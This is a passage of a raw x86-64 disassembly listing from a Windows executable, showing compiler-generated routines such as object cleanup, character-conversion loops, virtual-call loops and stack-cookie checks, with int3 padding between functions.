   140001d53:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140001d57:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   140001d5b:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   140001d5f:	48 89 37             	mov    %rsi,(%rdi)
   140001d62:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001d66:	e8 81 ae 00 00       	call   0x14000cbec
   140001d6b:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140001d6f:	48 85 c9             	test   %rcx,%rcx
   140001d72:	74 05                	je     0x140001d79
   140001d74:	e8 6b 4f 01 00       	call   0x140016ce4
   140001d79:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001d7d:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   140001d81:	48 85 c9             	test   %rcx,%rcx
   140001d84:	74 05                	je     0x140001d8b
   140001d86:	e8 59 4f 01 00       	call   0x140016ce4
   140001d8b:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140001d8f:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   140001d93:	48 85 c9             	test   %rcx,%rcx
   140001d96:	74 05                	je     0x140001d9d
   140001d98:	e8 47 4f 01 00       	call   0x140016ce4
   140001d9d:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140001da1:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   140001da5:	48 85 c9             	test   %rcx,%rcx
   140001da8:	74 05                	je     0x140001daf
   140001daa:	e8 35 4f 01 00       	call   0x140016ce4
   140001daf:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140001db3:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   140001db7:	48 85 c9             	test   %rcx,%rcx
   140001dba:	74 05                	je     0x140001dc1
   140001dbc:	e8 23 4f 01 00       	call   0x140016ce4
   140001dc1:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140001dc5:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   140001dc9:	48 85 c9             	test   %rcx,%rcx
   140001dcc:	74 05                	je     0x140001dd3
   140001dce:	e8 11 4f 01 00       	call   0x140016ce4
   140001dd3:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140001dd7:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001ddb:	e8 94 8e 00 00       	call   0x14000ac74
   140001de0:	90                   	nop
   140001de1:	b8 02 00 00 00       	mov    $0x2,%eax
   140001de6:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140001ded:	00 
   140001dee:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140001df2:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140001df6:	49 8b e3             	mov    %r11,%rsp
   140001df9:	41 5e                	pop    %r14
   140001dfb:	5f                   	pop    %rdi
   140001dfc:	5d                   	pop    %rbp
   140001dfd:	c3                   	ret
   140001dfe:	48 8d 0d 6b 96 03 00 	lea    0x3966b(%rip),%rcx        # 0x14003b470
   140001e05:	e8 ea 90 00 00       	call   0x14000aef4
   140001e0a:	cc                   	int3
   140001e0b:	cc                   	int3
   140001e0c:	cc                   	int3
   140001e0d:	cc                   	int3
   140001e0e:	cc                   	int3
   140001e0f:	cc                   	int3
   140001e10:	0f b6 c2             	movzbl %dl,%eax
   140001e13:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001e17:	8b c8                	mov    %eax,%ecx
   140001e19:	e9 6e c6 00 00       	jmp    0x14000e48c
   140001e1e:	cc                   	int3
   140001e1f:	cc                   	int3
   140001e20:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001e25:	56                   	push   %rsi
   140001e26:	48 83 ec 20          	sub    $0x20,%rsp
   140001e2a:	49 8b f0             	mov    %r8,%rsi
   140001e2d:	48 8b da             	mov    %rdx,%rbx
   140001e30:	49 3b d0             	cmp    %r8,%rdx
   140001e33:	74 25                	je     0x140001e5a
   140001e35:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001e3a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   140001e3e:	66 90                	xchg   %ax,%ax
   140001e40:	0f b6 0b             	movzbl (%rbx),%ecx
   140001e43:	48 8b d7             	mov    %rdi,%rdx
   140001e46:	e8 41 c6 00 00       	call   0x14000e48c
   140001e4b:	88 03                	mov    %al,(%rbx)
   140001e4d:	48 ff c3             	inc    %rbx
   140001e50:	48 3b de             	cmp    %rsi,%rbx
   140001e53:	75 eb                	jne    0x140001e40
   140001e55:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001e5a:	48 8b c3             	mov    %rbx,%rax
   140001e5d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001e62:	48 83 c4 20          	add    $0x20,%rsp
   140001e66:	5e                   	pop    %rsi
   140001e67:	c3                   	ret
   140001e68:	cc                   	int3
   140001e69:	cc                   	int3
   140001e6a:	cc                   	int3
   140001e6b:	cc                   	int3
   140001e6c:	cc                   	int3
   140001e6d:	cc                   	int3
   140001e6e:	cc                   	int3
   140001e6f:	cc                   	int3
   140001e70:	0f b6 c2             	movzbl %dl,%eax
   140001e73:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140001e77:	8b c8                	mov    %eax,%ecx
   140001e79:	e9 56 c8 00 00       	jmp    0x14000e6d4
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001e85:	56                   	push   %rsi
   140001e86:	48 83 ec 20          	sub    $0x20,%rsp
   140001e8a:	49 8b f0             	mov    %r8,%rsi
   140001e8d:	48 8b da             	mov    %rdx,%rbx
   140001e90:	49 3b d0             	cmp    %r8,%rdx
   140001e93:	74 25                	je     0x140001eba
   140001e95:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140001e9a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   140001e9e:	66 90                	xchg   %ax,%ax
   140001ea0:	0f b6 0b             	movzbl (%rbx),%ecx
   140001ea3:	48 8b d7             	mov    %rdi,%rdx
   140001ea6:	e8 29 c8 00 00       	call   0x14000e6d4
   140001eab:	88 03                	mov    %al,(%rbx)
   140001ead:	48 ff c3             	inc    %rbx
   140001eb0:	48 3b de             	cmp    %rsi,%rbx
   140001eb3:	75 eb                	jne    0x140001ea0
   140001eb5:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001eba:	48 8b c3             	mov    %rbx,%rax
   140001ebd:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001ec2:	48 83 c4 20          	add    $0x20,%rsp
   140001ec6:	5e                   	pop    %rsi
   140001ec7:	c3                   	ret
   140001ec8:	cc                   	int3
   140001ec9:	cc                   	int3
   140001eca:	cc                   	int3
   140001ecb:	cc                   	int3
   140001ecc:	cc                   	int3
   140001ecd:	cc                   	int3
   140001ece:	cc                   	int3
   140001ecf:	cc                   	int3
   140001ed0:	0f b6 c2             	movzbl %dl,%eax
   140001ed3:	c3                   	ret
   140001ed4:	cc                   	int3
   140001ed5:	cc                   	int3
   140001ed6:	cc                   	int3
   140001ed7:	cc                   	int3
   140001ed8:	cc                   	int3
   140001ed9:	cc                   	int3
   140001eda:	cc                   	int3
   140001edb:	cc                   	int3
   140001edc:	cc                   	int3
   140001edd:	cc                   	int3
   140001ede:	cc                   	int3
   140001edf:	cc                   	int3
   140001ee0:	40 53                	rex push %rbx
   140001ee2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ee6:	49 8b d8             	mov    %r8,%rbx
   140001ee9:	49 8b c9             	mov    %r9,%rcx
   140001eec:	4c 2b c2             	sub    %rdx,%r8
   140001eef:	e8 dc c0 02 00       	call   0x14002dfd0
   140001ef4:	48 8b c3             	mov    %rbx,%rax
   140001ef7:	48 83 c4 20          	add    $0x20,%rsp
   140001efb:	5b                   	pop    %rbx
   140001efc:	c3                   	ret
   140001efd:	cc                   	int3
   140001efe:	cc                   	int3
   140001eff:	cc                   	int3
   140001f00:	40 53                	rex push %rbx
   140001f02:	48 83 ec 20          	sub    $0x20,%rsp
   140001f06:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001f0b:	49 8b d8             	mov    %r8,%rbx
   140001f0e:	4c 2b c2             	sub    %rdx,%r8
   140001f11:	e8 ba c0 02 00       	call   0x14002dfd0
   140001f16:	48 8b c3             	mov    %rbx,%rax
   140001f19:	48 83 c4 20          	add    $0x20,%rsp
   140001f1d:	5b                   	pop    %rbx
   140001f1e:	c3                   	ret
   140001f1f:	cc                   	int3
   140001f20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001f25:	57                   	push   %rdi
   140001f26:	48 83 ec 20          	sub    $0x20,%rsp
   140001f2a:	48 8d 05 f7 e6 02 00 	lea    0x2e6f7(%rip),%rax        # 0x140030628
   140001f31:	8b fa                	mov    %edx,%edi
   140001f33:	48 89 01             	mov    %rax,(%rcx)
   140001f36:	48 8b d9             	mov    %rcx,%rbx
   140001f39:	8b 41 20             	mov    0x20(%rcx),%eax
   140001f3c:	85 c0                	test   %eax,%eax
   140001f3e:	7e 0b                	jle    0x140001f4b
   140001f40:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001f44:	e8 9b 4d 01 00       	call   0x140016ce4
   140001f49:	eb 0b                	jmp    0x140001f56
   140001f4b:	79 09                	jns    0x140001f56
   140001f4d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001f51:	e8 ca ce 00 00       	call   0x14000ee20
   140001f56:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140001f5a:	e8 85 4d 01 00       	call   0x140016ce4
   140001f5f:	48 8d 05 a2 e6 02 00 	lea    0x2e6a2(%rip),%rax        # 0x140030608
   140001f66:	48 89 03             	mov    %rax,(%rbx)
   140001f69:	40 f6 c7 01          	test   $0x1,%dil
   140001f6d:	74 0d                	je     0x140001f7c
   140001f6f:	ba 30 00 00 00       	mov    $0x30,%edx
   140001f74:	48 8b cb             	mov    %rbx,%rcx
   140001f77:	e8 a4 ce 00 00       	call   0x14000ee20
   140001f7c:	48 8b c3             	mov    %rbx,%rax
   140001f7f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001f84:	48 83 c4 20          	add    $0x20,%rsp
   140001f88:	5f                   	pop    %rdi
   140001f89:	c3                   	ret
   140001f8a:	cc                   	int3
   140001f8b:	cc                   	int3
   140001f8c:	cc                   	int3
   140001f8d:	cc                   	int3
   140001f8e:	cc                   	int3
   140001f8f:	cc                   	int3
   140001f90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001f95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001f9a:	55                   	push   %rbp
   140001f9b:	57                   	push   %rdi
   140001f9c:	41 56                	push   %r14
   140001f9e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001fa3:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   140001faa:	48 8b da             	mov    %rdx,%rbx
   140001fad:	48 8b f9             	mov    %rcx,%rdi
   140001fb0:	45 33 f6             	xor    %r14d,%r14d
   140001fb3:	48 85 c9             	test   %rcx,%rcx
   140001fb6:	0f 84 5d 01 00 00    	je     0x140002119
   140001fbc:	4c 39 31             	cmp    %r14,(%rcx)
   140001fbf:	0f 85 54 01 00 00    	jne    0x140002119
   140001fc5:	b9 60 00 00 00       	mov    $0x60,%ecx
   140001fca:	e8 59 ce 00 00       	call   0x14000ee28
   140001fcf:	48 8b f0             	mov    %rax,%rsi
   140001fd2:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001fd6:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001fda:	48 85 c9             	test   %rcx,%rcx
   140001fdd:	74 0f                	je     0x140001fee
   140001fdf:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   140001fe3:	48 85 db             	test   %rbx,%rbx
   140001fe6:	75 0d                	jne    0x140001ff5
   140001fe8:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   140001fec:	eb 07                	jmp    0x140001ff5
   140001fee:	48 8d 1d 98 94 03 00 	lea    0x39498(%rip),%rbx        # 0x14003b48d
   140001ff5:	33 d2                	xor    %edx,%edx
   140001ff7:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140001ffb:	e8 fc 8b 00 00       	call   0x14000abfc
   140002000:	90                   	nop
   140002001:	4c 89 75 af          	mov    %r14,-0x51(%rbp)
   140002005:	c6 45 b7 00          	movb   $0x0,-0x49(%rbp)
   140002009:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   14000200d:	c6 45 c7 00          	movb   $0x0,-0x39(%rbp)
   140002011:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140002015:	66 44 89 75 d7       	mov    %r14w,-0x29(%rbp)
   14000201a:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   14000201e:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   140002023:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140002027:	c6 45 f7 00          	movb   $0x0,-0x9(%rbp)
   14000202b:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   14000202f:	c6 45 07 00          	movb   $0x0,0x7(%rbp)
   140002033:	48 85 db             	test   %rbx,%rbx
   140002036:	0f 84 fa 00 00 00    	je     0x140002136
   14000203c:	48 8b d3             	mov    %rbx,%rdx
   14000203f:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140002043:	e8 38 ab 00 00       	call   0x14000cb80
   140002048:	90                   	nop
   140002049:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   14000204d:	48 8d 05 5c e8 02 00 	lea    0x2e85c(%rip),%rax        # 0x1400308b0
   140002054:	48 89 06             	mov    %rax,(%rsi)
   140002057:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   14000205b:	e8 6c c3 00 00       	call   0x14000e3cc
   140002060:	0f 10 00             	movups (%rax),%xmm0
   140002063:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002067:	0f 11 46 10          	movups %xmm0,0x10(%rsi)
   14000206b:	0f 11 4e 20          	movups %xmm1,0x20(%rsi)
   14000206f:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   140002073:	e8 48 c5 00 00       	call   0x14000e5c0
   140002078:	0f 10 08             	movups (%rax),%xmm1
   14000207b:	0f 10 50 10          	movups 0x10(%rax),%xmm2
   14000207f:	f2 0f 10 40 20       	movsd  0x20(%rax),%xmm0
   140002084:	8b 48 28             	mov    0x28(%rax),%ecx
   140002087:	0f 11 4e 30          	movups %xmm1,0x30(%rsi)
   14000208b:	0f 11 56 40          	movups %xmm2,0x40(%rsi)
   14000208f:	f2 0f 11 46 50       	movsd  %xmm0,0x50(%rsi)
   140002094:	89 4e 58             	mov    %ecx,0x58(%rsi)
   140002097:	48 89 37             	mov    %rsi,(%rdi)
   14000209a:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   14000209e:	e8 49 ab 00 00       	call   0x14000cbec
   1400020a3:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   1400020a7:	48 85 c9             	test   %rcx,%rcx
   1400020aa:	74 05                	je     0x1400020b1
   1400020ac:	e8 33 4c 01 00       	call   0x140016ce4
   1400020b1:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   1400020b5:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1400020b9:	48 85 c9             	test   %rcx,%rcx
   1400020bc:	74 05                	je     0x1400020c3
   1400020be:	e8 21 4c 01 00       	call   0x140016ce4
   1400020c3:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   1400020c7:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   1400020cb:	48 85 c9             	test   %rcx,%rcx
   1400020ce:	74 05                	je     0x1400020d5
   1400020d0:	e8 0f 4c 01 00       	call   0x140016ce4
   1400020d5:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   1400020d9:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   1400020dd:	48 85 c9             	test   %rcx,%rcx
   1400020e0:	74 05                	je     0x1400020e7
   1400020e2:	e8 fd 4b 01 00       	call   0x140016ce4
   1400020e7:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   1400020eb:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   1400020ef:	48 85 c9             	test   %rcx,%rcx
   1400020f2:	74 05                	je     0x1400020f9
   1400020f4:	e8 eb 4b 01 00       	call   0x140016ce4
   1400020f9:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   1400020fd:	48 8b 4d af          	mov    -0x51(%rbp),%rcx
   140002101:	48 85 c9             	test   %rcx,%rcx
   140002104:	74 05                	je     0x14000210b
   140002106:	e8 d9 4b 01 00       	call   0x140016ce4
   14000210b:	4c 89 75 af          	mov    %r14,-0x51(%rbp)
   14000210f:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   140002113:	e8 5c 8b 00 00       	call   0x14000ac74
   140002118:	90                   	nop
   140002119:	b8 02 00 00 00       	mov    $0x2,%eax
   14000211e:	4c 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%r11
   140002125:	00 
   140002126:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000212a:	49 8b 73 30          	mov    0x30(%r11),%rsi
   14000212e:	49 8b e3             	mov    %r11,%rsp
   140002131:	41 5e                	pop    %r14
   140002133:	5f                   	pop    %rdi
   140002134:	5d                   	pop    %rbp
   140002135:	c3                   	ret
   140002136:	48 8d 0d 33 93 03 00 	lea    0x39333(%rip),%rcx        # 0x14003b470
   14000213d:	e8 b2 8d 00 00       	call   0x14000aef4
   140002142:	cc                   	int3
   140002143:	cc                   	int3
   140002144:	cc                   	int3
   140002145:	cc                   	int3
   140002146:	cc                   	int3
   140002147:	cc                   	int3
   140002148:	cc                   	int3
   140002149:	cc                   	int3
   14000214a:	cc                   	int3
   14000214b:	cc                   	int3
   14000214c:	cc                   	int3
   14000214d:	cc                   	int3
   14000214e:	cc                   	int3
   14000214f:	cc                   	int3
   140002150:	40 53                	rex push %rbx
   140002152:	48 83 ec 20          	sub    $0x20,%rsp
   140002156:	0f b7 da             	movzwl %dx,%ebx
   140002159:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   14000215d:	41 0f b7 c8          	movzwl %r8w,%ecx
   140002161:	e8 96 c1 00 00       	call   0x14000e2fc
   140002166:	66 85 c3             	test   %ax,%bx
   140002169:	0f 95 c0             	setne  %al
   14000216c:	48 83 c4 20          	add    $0x20,%rsp
   140002170:	5b                   	pop    %rbx
   140002171:	c3                   	ret
   140002172:	cc                   	int3
   140002173:	cc                   	int3
   140002174:	cc                   	int3
   140002175:	cc                   	int3
   140002176:	cc                   	int3
   140002177:	cc                   	int3
   140002178:	cc                   	int3
   140002179:	cc                   	int3
   14000217a:	cc                   	int3
   14000217b:	cc                   	int3
   14000217c:	cc                   	int3
   14000217d:	cc                   	int3
   14000217e:	cc                   	int3
   14000217f:	cc                   	int3
   140002180:	4d 8b d9             	mov    %r9,%r11
   140002183:	4d 8b d0             	mov    %r8,%r10
   140002186:	48 8b c2             	mov    %rdx,%rax
   140002189:	4c 8d 49 10          	lea    0x10(%rcx),%r9
   14000218d:	4d 8b c3             	mov    %r11,%r8
   140002190:	49 8b d2             	mov    %r10,%rdx
   140002193:	48 8b c8             	mov    %rax,%rcx
   140002196:	e9 91 c1 00 00       	jmp    0x14000e32c
   14000219b:	cc                   	int3
   14000219c:	cc                   	int3
   14000219d:	cc                   	int3
   14000219e:	cc                   	int3
   14000219f:	cc                   	int3
   1400021a0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021a5:	55                   	push   %rbp
   1400021a6:	56                   	push   %rsi
   1400021a7:	57                   	push   %rdi
   1400021a8:	48 83 ec 20          	sub    $0x20,%rsp
   1400021ac:	49 8b f9             	mov    %r9,%rdi
   1400021af:	49 8b d8             	mov    %r8,%rbx
   1400021b2:	0f b7 ea             	movzwl %dx,%ebp
   1400021b5:	48 8b f1             	mov    %rcx,%rsi
   1400021b8:	4d 3b c1             	cmp    %r9,%r8
   1400021bb:	74 20                	je     0x1400021dd
   1400021bd:	0f 1f 00             	nopl   (%rax)
   1400021c0:	48 8b 06             	mov    (%rsi),%rax
   1400021c3:	0f b7 d5             	movzwl %bp,%edx
   1400021c6:	44 0f b7 03          	movzwl (%rbx),%r8d
   1400021ca:	48 8b ce             	mov    %rsi,%rcx
   1400021cd:	ff 50 20             	call   *0x20(%rax)
   1400021d0:	84 c0                	test   %al,%al
   1400021d2:	75 09                	jne    0x1400021dd
   1400021d4:	48 83 c3 02          	add    $0x2,%rbx
   1400021d8:	48 3b df             	cmp    %rdi,%rbx
   1400021db:	75 e3                	jne    0x1400021c0
   1400021dd:	48 8b c3             	mov    %rbx,%rax
   1400021e0:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400021e5:	48 83 c4 20          	add    $0x20,%rsp
   1400021e9:	5f                   	pop    %rdi
   1400021ea:	5e                   	pop    %rsi
   1400021eb:	5d                   	pop    %rbp
   1400021ec:	c3                   	ret
   1400021ed:	cc                   	int3
   1400021ee:	cc                   	int3
   1400021ef:	cc                   	int3
   1400021f0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400021f5:	55                   	push   %rbp
   1400021f6:	56                   	push   %rsi
   1400021f7:	57                   	push   %rdi
   1400021f8:	48 83 ec 20          	sub    $0x20,%rsp
   1400021fc:	49 8b f9             	mov    %r9,%rdi
   1400021ff:	49 8b d8             	mov    %r8,%rbx
   140002202:	0f b7 ea             	movzwl %dx,%ebp
   140002205:	48 8b f1             	mov    %rcx,%rsi
   140002208:	4d 3b c1             	cmp    %r9,%r8
   14000220b:	74 20                	je     0x14000222d
   14000220d:	0f 1f 00             	nopl   (%rax)
   140002210:	48 8b 06             	mov    (%rsi),%rax
   140002213:	0f b7 d5             	movzwl %bp,%edx
   140002216:	44 0f b7 03          	movzwl (%rbx),%r8d
   14000221a:	48 8b ce             	mov    %rsi,%rcx
   14000221d:	ff 50 20             	call   *0x20(%rax)
   140002220:	84 c0                	test   %al,%al
   140002222:	74 09                	je     0x14000222d
   140002224:	48 83 c3 02          	add    $0x2,%rbx
   140002228:	48 3b df             	cmp    %rdi,%rbx
   14000222b:	75 e3                	jne    0x140002210
   14000222d:	48 8b c3             	mov    %rbx,%rax
   140002230:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002235:	48 83 c4 20          	add    $0x20,%rsp
   140002239:	5f                   	pop    %rdi
   14000223a:	5e                   	pop    %rsi
   14000223b:	5d                   	pop    %rbp
   14000223c:	c3                   	ret
   14000223d:	cc                   	int3
   14000223e:	cc                   	int3
   14000223f:	cc                   	int3
   140002240:	0f b7 c2             	movzwl %dx,%eax
   140002243:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   140002247:	0f b7 c8             	movzwl %ax,%ecx
   14000224a:	e9 09 c1 00 00       	jmp    0x14000e358
   14000224f:	cc                   	int3
   140002250:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002255:	56                   	push   %rsi
   140002256:	48 83 ec 20          	sub    $0x20,%rsp
   14000225a:	49 8b f0             	mov    %r8,%rsi
   14000225d:	48 8b da             	mov    %rdx,%rbx
   140002260:	49 3b d0             	cmp    %r8,%rdx
   140002263:	74 27                	je     0x14000228c
   140002265:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   14000226a:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   14000226e:	66 90                	xchg   %ax,%ax
   140002270:	0f b7 0b             	movzwl (%rbx),%ecx
   140002273:	48 8b d7             	mov    %rdi,%rdx
   140002276:	e8 dd c0 00 00       	call   0x14000e358
   14000227b:	66 89 03             	mov    %ax,(%rbx)
   14000227e:	48 83 c3 02          	add    $0x2,%rbx
   140002282:	48 3b de             	cmp    %rsi,%rbx
   140002285:	75 e9                	jne    0x140002270
   140002287:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000228c:	48 8b c3             	mov    %rbx,%rax
   14000228f:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140002294:	48 83 c4 20          	add    $0x20,%rsp
   140002298:	5e                   	pop    %rsi
   140002299:	c3                   	ret
   14000229a:	cc                   	int3
   14000229b:	cc                   	int3
   14000229c:	cc                   	int3
   14000229d:	cc                   	int3
   14000229e:	cc                   	int3
   14000229f:	cc                   	int3
   1400022a0:	0f b7 c2             	movzwl %dx,%eax
   1400022a3:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   1400022a7:	0f b7 c8             	movzwl %ax,%ecx
   1400022aa:	e9 69 c5 00 00       	jmp    0x14000e818
   1400022af:	cc                   	int3
   1400022b0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400022b5:	56                   	push   %rsi
   1400022b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400022ba:	49 8b f0             	mov    %r8,%rsi
   1400022bd:	48 8b da             	mov    %rdx,%rbx
   1400022c0:	49 3b d0             	cmp    %r8,%rdx
   1400022c3:	74 27                	je     0x1400022ec
   1400022c5:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1400022ca:	48 8d 79 10          	lea    0x10(%rcx),%rdi
   1400022ce:	66 90                	xchg   %ax,%ax
   1400022d0:	0f b7 0b             	movzwl (%rbx),%ecx
   1400022d3:	48 8b d7             	mov    %rdi,%rdx
   1400022d6:	e8 3d c5 00 00       	call   0x14000e818
   1400022db:	66 89 03             	mov    %ax,(%rbx)
   1400022de:	48 83 c3 02          	add    $0x2,%rbx
   1400022e2:	48 3b de             	cmp    %rsi,%rbx
   1400022e5:	75 e9                	jne    0x1400022d0
   1400022e7:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400022ec:	48 8b c3             	mov    %rbx,%rax
   1400022ef:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400022f4:	48 83 c4 20          	add    $0x20,%rsp
   1400022f8:	5e                   	pop    %rsi
   1400022f9:	c3                   	ret
   1400022fa:	cc                   	int3
   1400022fb:	cc                   	int3
   1400022fc:	cc                   	int3
   1400022fd:	cc                   	int3
   1400022fe:	cc                   	int3
   1400022ff:	cc                   	int3
   140002300:	48 83 ec 58          	sub    $0x58,%rsp
   140002304:	48 8b 05 35 0d 04 00 	mov    0x40d35(%rip),%rax        # 0x140043040
   14000230b:	48 33 c4             	xor    %rsp,%rax
   14000230e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002313:	48 8d 41 30          	lea    0x30(%rcx),%rax
   140002317:	88 54 24 30          	mov    %dl,0x30(%rsp)
   14000231b:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002320:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002325:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   14000232a:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140002331:	00 00 
   140002333:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140002338:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000233e:	e8 d9 86 00 00       	call   0x14000aa1c
   140002343:	0f b7 4c 24 38       	movzwl 0x38(%rsp),%ecx
   140002348:	85 c0                	test   %eax,%eax
   14000234a:	ba ff ff 00 00       	mov    $0xffff,%edx
   14000234f:	66 0f 48 ca          	cmovs  %dx,%cx
   140002353:	0f b7 c1             	movzwl %cx,%eax
   140002356:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000235b:	48 33 cc             	xor    %rsp,%rcx
   14000235e:	e8 9d ca 00 00       	call   0x14000ee00
   140002363:	48 83 c4 58          	add    $0x58,%rsp
   140002367:	c3                   	ret
   140002368:	cc                   	int3
   140002369:	cc                   	int3
   14000236a:	cc                   	int3
   14000236b:	cc                   	int3
   14000236c:	cc                   	int3
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	40 53                	rex push %rbx
   140002372:	56                   	push   %rsi
   140002373:	57                   	push   %rdi
   140002374:	48 83 ec 60          	sub    $0x60,%rsp
   140002378:	48 8b 05 c1 0c 04 00 	mov    0x40cc1(%rip),%rax        # 0x140043040
   14000237f:	48 33 c4             	xor    %rsp,%rax
   140002382:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002387:	49 8b f9             	mov    %r9,%rdi
   14000238a:	49 8b f0             	mov    %r8,%rsi
   14000238d:	48 8b da             	mov    %rdx,%rbx
   140002390:	49 3b d0             	cmp    %r8,%rdx
   140002393:	0f 84 80 00 00 00    	je     0x140002419
   140002399:	48 89 ac 24 90 00 00 	mov    %rbp,0x90(%rsp)
   1400023a0:	00 
   1400023a1:	48 8d 69 30          	lea    0x30(%rcx),%rbp
   1400023a5:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1400023aa:	45 33 f6             	xor    %r14d,%r14d
   1400023ad:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   1400023b2:	41 bf ff ff 00 00    	mov    $0xffff,%r15d
   1400023b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400023bf:	00 
   1400023c0:	0f b6 03             	movzbl (%rbx),%eax
   1400023c3:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400023c8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400023ce:	88 44 24 30          	mov    %al,0x30(%rsp)
   1400023d2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400023d7:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   1400023dc:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400023e1:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
